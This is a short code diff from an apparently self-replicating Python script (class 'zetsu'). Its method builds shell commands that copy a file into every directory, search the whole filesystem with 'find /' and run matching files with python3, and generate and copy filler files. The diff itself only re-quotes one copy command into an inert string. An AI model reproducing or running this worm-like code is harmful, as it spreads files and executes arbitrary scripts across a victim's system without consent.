@@ -31,7 +31,7 @@ class zetsu:
 
     def lanjut(self):
         yy = [f'ls -h | grep / | xargs -I % cp {self.tt[-1]} %/{self.tt[-1]}', f'find / | grep {self.yh} | uniq | xargs -I @ python3 @']
-        bb = 'find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',self.tt[-1],'@'
+        bb = """'find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',self.tt[-1],'@'"""
         subprocess.call(['mkdir', self.tt[-1]])
         self.genuk(1024, self.ff)
         subprocess.call(['cp',self.ff,self.tt[-1]])
